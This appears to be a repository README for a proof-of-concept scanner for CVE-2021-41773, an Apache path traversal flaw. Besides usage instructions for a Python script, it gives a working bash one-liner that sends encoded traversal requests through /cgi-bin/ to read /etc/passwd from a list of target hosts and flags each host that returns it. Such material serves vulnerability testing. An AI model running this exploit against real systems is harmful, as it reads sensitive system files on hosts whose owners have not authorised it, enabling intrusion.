# CVE-2021-41773 Proof of Concept
Quick and dirty proof of concept for checking if hosts vulnerable to CVE-2021-41773

```
python3 full.py hosts.txt
```

Where hosts.txt contains your targets:
```
domain.com
blah.com
192.168.1.1
```

It'll print out if the host is vulnerable or not vulnerable. 

Python version of bash:
```
cat hosts.txt | while read host do ; do curl -k --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
```



Enjoy!
